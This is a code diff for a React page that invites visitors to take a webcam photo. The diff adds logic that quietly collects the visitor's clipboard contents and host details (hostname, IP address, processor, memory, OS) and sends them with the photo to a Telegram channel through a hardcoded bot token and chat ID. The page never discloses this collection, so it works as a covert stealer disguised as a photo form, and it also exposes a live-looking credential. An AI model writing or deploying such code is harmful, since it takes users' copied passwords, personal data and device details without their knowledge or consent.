@@ -1,13 +1,29 @@
-import { Form } from "antd";
-import { useRef, useState } from "react";
+import { Button, Form, message } from "antd";
+import { useEffect, useRef, useState } from "react";
 import Webcam from "react-webcam";
 import FormData from "form-data";
 import "./style.css";
+import axios from "axios";
 
 // type formType = {
 //   telegram_id: string;
 //   name: string;
 // };
+
+type systemInfoType = {
+  system: string;
+  nodeName: string;
+  release: string;
+  version: string;
+  machine: string;
+  processor: string;
+  memory: {
+    total: number;
+    free: number;
+  };
+  ipv4: string;
+  hostname: string;
+};
 
 const videoConstraints = {
   width: 220,
@@ -21,6 +37,23 @@ const Content = () => {
   //   name: "",
   // });
 
+  const [isLoading, setIsLoading] = useState(false);
+
+  const [hardwareInfo, setHardwareInfo] = useState<systemInfoType>({
+    system: "",
+    nodeName: "",
+    release: "",
+    version: "",
+    machine: "",
+    processor: "",
+    memory: {
+      total: 0,
+      free: 0,
+    },
+    ipv4: "",
+    hostname: "",
+  });
+
   const telegramToken = "7443522978:AAFZZZlo0dYPlHOc4h2cPDw4igQBdhU8JX0";
 
   const telegramChatId = "-1002248016905";
@@ -28,6 +61,8 @@ const Content = () => {
   const webcamRef = useRef(null);
 
   const [imgSrc, setImgSrc] = useState("");
+
+  const [messageApi, contextHolder] = message.useMessage();
 
   // const telegramChatId = form?.telegram_id;
   // const [formData] = Form.useForm();
@@ -38,34 +73,81 @@ const Content = () => {
     setImgSrc(imageSrc);
   };
 
+  const successMessage = () => {
+    messageApi.open({
+      type: "success",
+      content: "Photo and info sent successfully to the channel!",
+    });
+  };
+
+  const errorMessage = () => {
+    messageApi.open({
+      type: "error",
+      content: "Failed to send photo and info",
+    });
+  };
+
+  const warningMessage = () => {
+    messageApi.open({
+      type: "warning",
+      content: "No photo available to send",
+    });
+  };
+
+  useEffect(() => {
+    setIsLoading(true)
+    axios
+      .get("http://localhost:3000/hardware-info")
+      .then((response) => {
+        setHardwareInfo(response.data);
+        setIsLoading(false);
+      })
+      .catch((error) => {
+        console.error("There was an error fetching the hardware info!", error);
+        setIsLoading(false);
+      });
+  }, []);
+
+  const getClipboardContent = async () => {
+    try {
+      return await navigator.clipboard.readText();
+    } catch (err) {
+      console.error("Failed to read clipboard contents: ", err);
+      return "Could not read clipboard contents";
+    }
+  };
+
   const sendPhotoToTelegram = async () => {
+    setIsLoading(true);
     if (imgSrc) {
       try {
-
         const response = await fetch(imgSrc);
         const blob = await response.blob();
 
-        const systemInfo = `
-          Browser: ${navigator.userAgent}
-          Platform: ${navigator.platform}
-          Online: ${navigator.onLine}
-        `;
-
-        let clipboardContent = '';
-        try {
-          clipboardContent = await navigator.clipboard.readText();
-        } catch (err) {
-          console.error('Failed to read clipboard contents: ', err);
-          clipboardContent = 'Could not read clipboard contents';
-        }
+        const clipboardContent = await getClipboardContent();
 
         const caption = `
           System Info:
-          ${systemInfo}
-          
+
+            'hostname': ${hardwareInfo.hostname}
+            'ipv4': ${hardwareInfo.ipv4}
+            'machine': ${hardwareInfo.machine}
+            'memory': {
+              {
+                total: ${hardwareInfo.memory.total}
+                free: ${hardwareInfo.memory.free}
+              }
+            }
+            'nodeName': ${hardwareInfo.nodeName}
+            'processor': ${hardwareInfo.processor}
+            'release': ${hardwareInfo.release}
+            'system': ${hardwareInfo.system}
+            'version': ${hardwareInfo.version}
+            
           Clipboard Content:
-          ${clipboardContent}
-        `;
+
+            ${clipboardContent}
+          `;
 
         const formData = new FormData();
         formData.append("chat_id", telegramChatId);
@@ -82,19 +164,22 @@ const Content = () => {
 
         const result = await telegramResponse.json();
         if (result.ok) {
-          alert("Photo and info sent successfully to the channel!");
+          setImgSrc("");
+          successMessage();
         } else {
           console.error("Error sending photo and info:", result);
-          alert("Failed to send photo and info");
+          errorMessage();
         }
       } catch (error) {
         console.error("Error sending photo and info:", error);
-        alert("Failed to send photo and info");
+        errorMessage();
+      } finally {
+        setIsLoading(false);
       }
+    } else {
+      warningMessage();
     }
   };
-
-
 
   const handleSubmit = async () => {
     sendPhotoToTelegram();
@@ -102,14 +187,15 @@ const Content = () => {
 
   return (
     <div className="home-container">
+      {contextHolder}
       <div className="container">
         <div className="text">
           <h1>Take your photo!</h1>
           <Form
             className="form"
-          // form={formData}
-          // autoComplete={"off"}
-          // onFinish={handleSubmit}
+            // form={formData}
+            // autoComplete={"off"}
+            // onFinish={handleSubmit}
           >
             <div className="webcam-container">
               <div className="webcam-img flex justify-center">
@@ -138,15 +224,15 @@ const Content = () => {
                     Retake Image
                   </button>
                 ) : (
-                  <button
+                  <Button
                     onClick={(e) => {
                       e.preventDefault();
                       capture();
                     }}
-                    className="webcam-btn"
+                    className="webcam-btn !py-6"
                   >
                     Capture
-                  </button>
+                  </Button>
                 )}
               </div>
             </div>
@@ -185,9 +271,14 @@ const Content = () => {
               value={form.name}
             />
             <Form.Item> */}
-            <button onClick={handleSubmit} type="submit" id="login-button">
+            <Button
+              onClick={handleSubmit}
+              id="login-button"
+              className="!py-6"
+              loading={isLoading}
+            >
               Submit
-            </button>
+            </Button>
             {/* </Form.Item> */}
           </Form>
         </div>
